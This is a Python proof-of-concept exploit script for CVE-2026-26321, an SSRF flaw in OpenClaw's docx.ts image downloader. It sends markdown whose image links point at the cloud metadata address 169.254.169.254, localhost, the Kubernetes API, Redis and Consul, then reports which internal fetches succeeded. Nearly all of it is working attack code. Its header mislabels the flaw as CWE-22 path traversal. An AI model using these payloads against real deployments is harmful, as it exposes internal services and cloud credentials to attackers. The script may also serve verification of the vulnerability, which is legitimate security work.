#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OpenClaw < 2026.2.14 - SSRF via docx.ts downloadImage()
# CVE            : CVE-2026-26321
# Vendor         : OpenClaw
# Product        : OpenClaw
# Affected       : < 2026.2.14
# Type           : CWE-22 - Path Traversal
# CVSS           : 7.5 (High)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-26321 — PoC Vector 3: SSRF via downloadImage() in docx.ts

The downloadImage() function calls fetch(url) on URLs extracted from markdown
image references (![alt](url)) without any SSRF validation.

USAGE:
  python3 poc_vector3_docx_ssrf.py <host> <port>
  python3 poc_vector3_docx_ssrf.py localhost 8632
"""

import sys
import json
import urllib.request
import urllib.error


def api_post(base_url, endpoint, payload):
    """POST JSON to the harness and return the parsed response."""
    url = f"{base_url}{endpoint}"
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode("utf-8")), resp.status
    except urllib.error.HTTPError as e:
        body = json.loads(e.read().decode("utf-8"))
        return body, e.code
    except Exception as e:
        return {"status": "error", "error": str(e)}, 0


def check_health(base_url):
    try:
        req = urllib.request.Request(f"{base_url}/health")
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status == 200
    except Exception:
        return False


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print(f"Example: {sys.argv[0]} localhost 8632")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    base_url = f"http://{host}:{port}"

    print("""
======================================================================
  CVE-2026-26321 — Vector 3: SSRF via docx.ts downloadImage()
  Markdown image URLs fetched without SSRF protection
======================================================================
""")

    print(f"  Target: {base_url}")
    print()

    print("[*] Checking target...", end=" ")
    if not check_health(base_url):
        print("FAILED")
        sys.exit(1)
    print("OK")
    print()

    results = {}

    # Test 1: Markdown with internal SSRF targets
    print("[*] Test 1: Markdown with AWS metadata image URL")
    markdown = (
        "# Malicious Document\n\n"
        "Here is an image: ![exploit](http://169.254.169.254/latest/meta-data/)\n\n"
        "And another: ![internal](http://127.0.0.1:8080/health)\n"
    )
    resp, _ = api_post(base_url, "/docx-image", {"markdown": markdown})

    if resp.get("status") == "ok" and resp.get("urls_found", 0) >= 2:
        print(f"    [+] Extracted {resp['urls_found']} image URLs from markdown")
        for r in resp.get("results", []):
            url = r.get("url", "")
            if r.get("status") == "fetched":
                print(f"    [+] Fetched: {url} → HTTP {r.get('httpStatus')}")
            else:
                print(f"    [+] Attempted: {url} → {r.get('error', '')[:60]}")
        print("    [+] Confirms: downloadImage() fetches arbitrary URLs from markdown")
        results["Markdown SSRF extraction"] = True
    else:
        print(f"    [-] Unexpected: {resp}")
        results["Markdown SSRF extraction"] = False
    print()

    # Test 2: Markdown with multiple SSRF targets
    print("[*] Test 2: Markdown with multiple internal targets")
    markdown2 = (
        "![k8s](http://kubernetes.default.svc/api/v1/namespaces)\n"
        "![redis](http://redis:6379/)\n"
        "![consul](http://consul:8500/v1/agent/members)\n"
    )
    resp, _ = api_post(base_url, "/docx-image", {"markdown": markdown2})

    if resp.get("status") == "ok" and resp.get("urls_found", 0) >= 3:
        print(f"    [+] Extracted {resp['urls_found']} internal service URLs")
        for r in resp.get("results", []):
            url = r.get("url", "")
            print(f"    [+] Attempted: {url}")
        print("    [+] Confirms: no URL validation on markdown image references")
        results["Multi-target SSRF"] = True
    else:
        print(f"    [-] Unexpected: {resp}")
        results["Multi-target SSRF"] = False
    print()

    # Test 3: Markdown with no images (sanity check)
    print("[*] Test 3: Markdown with no images (sanity check)")
    resp, _ = api_post(base_url, "/docx-image", {"markdown": "# Normal doc\nNo images here."})

    if resp.get("urls_found", -1) == 0:
        print(f"    [+] Correctly found 0 image URLs in clean markdown")
        results["Sanity check"] = True
    else:
        print(f"    [-] Unexpected: {resp}")
        results["Sanity check"] = False
    print()

    # Summary
    print("=" * 60)
    print("  RESULTS SUMMARY — docx.ts SSRF Vector")
    print("=" * 60)
    for name, passed in results.items():
        icon = "+" if passed else "-"
        status = "PASS" if passed else "FAIL"
        print(f"  [{icon}] {status}: {name}")

    print()
    passed = sum(1 for v in results.values() if v)
    if passed > 0:
        print("[CONFIRMED] SSRF via docx.ts downloadImage() — bare fetch() on markdown image URLs")
    else:
        print("[UNVERIFIED] Tests did not pass as expected")
    print()
    return 0 if passed > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
